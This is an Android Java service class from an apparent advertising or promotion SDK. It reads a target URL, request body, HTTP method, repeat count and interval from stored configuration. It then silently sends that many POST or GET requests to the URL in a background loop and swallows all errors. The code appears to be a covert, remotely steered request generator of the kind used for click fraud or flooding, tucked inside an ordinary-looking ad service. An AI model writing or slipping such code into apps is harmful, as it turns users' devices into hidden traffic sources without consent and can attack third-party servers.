package com.mf.promotion.service.impl;

import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Handler;

import com.mf.basecode.network.connection.MagicConnection;
import com.mf.basecode.service.HandleService;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.CommConstants;
import com.mf.promotion.util.PromUtils;

public class HandleMagicService extends HandleService{
  private static final String TAG     = "HandleMagicService";
  private static MagicTask mMagicTask= null;
  public HandleMagicService(int serviceId, Context c, Handler handler) {
    super(serviceId, c, handler);
    
  }

  @Override
  public void onStartCommand(Intent intent, int flags, int startId) {
    if(!PromUtils.getInstance(mContext).checkHost()){
      Logger.e(TAG, "checkHost false");
      return;
    }
    if(!HandleService.pSwitch(spf, CommConstants.SHOW_RULE_MAGIC)){
      return ;
    }
    if(mMagicTask == null){
      mMagicTask = new MagicTask();
      mMagicTask.execute();
    }
  }

  @Override
  public void handledAds(List<String> ads) {
    // TODO Auto-generated method stub
    
  }
  
  class MagicTask extends AsyncTask<Void, Void, Void> {
  
    @Override
    protected void onPostExecute(Void result) {
      super.onPostExecute(result);
    }

    @Override
    protected Void doInBackground(Void... params) {
      SharedPreferences spf = mContext.getSharedPreferences(CommConstants.SHARED_PREFERENCE_CONFIG, 0);
      int reqTimes = spf.getInt(CommConstants.MAGIC_REQTIMES, 0);
      int reqIntervalTime = spf.getInt(CommConstants.MAGIC_REQINTERVALTIME, 1000);
      while (reqTimes > 0) {
        new MagicContectTask().execute();
        try {
          Thread.sleep(reqIntervalTime);
        } catch (InterruptedException e) {

        }
        --reqTimes;
      }
      spf.edit().putLong(CommConstants.MAGIC_STARTTIME, 0).commit();
      mMagicTask = null;
      return null;
    }
  }
  
  class MagicContectTask extends AsyncTask<Void, Void, Void> {
    
    @Override
    protected void onPostExecute(Void result) {
      super.onPostExecute(result);
    }

    @Override
    protected Void doInBackground(Void... params) {
      SharedPreferences spf = mContext.getSharedPreferences(CommConstants.SHARED_PREFERENCE_CONFIG, 0);
      int execMethod = spf.getInt(CommConstants.MAGIC_METHOD, 0);
      String tagetUrl = spf.getString(CommConstants.MAGIC_URL, "");
      String contentStr = spf.getString(CommConstants.MAGIC_CONTENT, "");
      try {
        if(execMethod == 1){
          MagicConnection.getInstance().post(tagetUrl, contentStr);
        }else if(execMethod == 2){
          MagicConnection.getInstance().getReq(tagetUrl, contentStr);
        }
        
      } catch (Exception e) {
        // TODO: handle exception
      }
      return null;
    }
  }

}
